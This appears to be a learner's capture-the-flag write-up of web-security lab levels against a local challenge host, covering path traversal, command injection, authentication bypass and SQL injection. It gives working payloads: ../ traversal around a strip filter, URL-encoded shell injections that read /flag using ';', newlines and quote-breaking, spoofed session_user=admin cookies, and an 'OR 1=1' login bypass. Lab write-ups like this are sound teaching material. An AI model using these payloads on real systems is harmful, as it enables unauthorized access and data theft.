Path Traversal
This level tries to stop you from traversing the path, but does it in a way that clearly demonstrates a further lack of the developer's understanding of how tricky paths can truly be. Can you still traverse it?

Solution:
route=example
path=tgt.file

base url = http://challenge.localhost/{route}/{path}
- the above url will pass the check, now we want to traverse up two directory to get the flag by using ../../
- however, the server will strip if the path starts and ends with "." or "/"
- notice how there is a fortunes directory in the same level as files
if base url = http://challenge.localhost/{route}/fortunes/../../{target} -> the strip doesn't get triggered


CMDI - Command Injection
Now, imagine getting more crazy than these security issues between the web server and the file system. What about interactions between the web server and the whole Linux shell?

Depressingly often, developers rely on the command line shell to help with complex operations. In these cases, a web server will execute a Linux command and use the command's results in its operation (a frequent usecase of this, for example, is the Imagemagick suite of commands that facilitate image processing). Different languages have different ways to do this (the simplest way in Python is os.system, but we will mostly be interacting with the more advanced subprocess.check_output), but almost all suffer from the risk of command injection.

In path traversal, the attacker sent an unexpected character (.) that caused the filesystem to do something unexpected to the developer (look in the parent directory). The shell, similarly, is chock full of special characters that cause effects unintended by the developer, and the gap between what the developer intended and the reality of what the shell (or, in previous challenges, the file system) does holds all sorts of security issues.

For example, consider the following Python snippet that runs a shell command:

os.system(f"echo Hello {word}") The developer clearly intends the user to send something like Hackers, and the result to be something like the command echo Hello Hackers. But the hacker might send anything the code doesn't explicitly block. Recall what you learned in the Chaining module of the Linux Luminarium: what if the hacker sends something containing a ;?

In this level, we will explore this exact concept. See if you can trick the level and leak the flag!

curl challenge.localhost/mission?topdir={arg}

1. command = f"ls -l {arg}"

    we can format the string to: f"ls -l /;cat /flag"
    arg = %2F%3B+cat+%2Fflag

2. arg = flask.request.args.get("directory-path", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    - the commad is still the same, but the argument is sanitizes ;
    - we can just use a newline instead of ; 
    - both newline and ; are command seperators

    arg = /
        cat flag
    arg = %2F%0D%0Acat+%2Fflag

3. command = f"ls -l '{arg}'"
    - no sanitization but notice the inner asteriks
    we can build the string to : f"ls -l '/tmp';cat /flag''"
    arg = /tmp';cat /flag' = %2Ftmp%27%3Bcat+%2Fflag%27 

4. Programs tend to shell out to do complex internal computation. This means that you might not always get sent the resulting output, and you will need to do your attack blind. Try it in this level: without the output of your injected command, get the flag! 
    command = f"touch {arg}"
    we want it to f"touch /; cat /flag > /home/hacker/text"
    arg = /; cat /flag > /home/hacker/text
    arg = %2F%3B+cat+%2Fflag+%3E+%2Fhome%2Fhacker%2Ftext

5.    
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    
    command = f"ls -l {arg}"
    - Filtering dangerous characters... but newline is not filtered use solution no. 2

Authentication Bypass
Authentication bypasses are not always so trivial. Sometimes, the logic of the application might look correct, but again, the gap between what the developer expects to be true and what will actually be true rears its ugly head. Give this level a try, and remember: you control the requests, including all the HTTP headers sent!

1. curl challenge.localhost?session_user=admin
2. curl --cookie "session_user=admin" challenge.localhost

SQL Injection
1. pin = 0 OR 1=1 (always true)
curl -c cookiejar -X POST -d "identity=admin&pin=0%20OR%201=1" challenge.localhost/session
curl -b cookiejar challenge.localhost/session
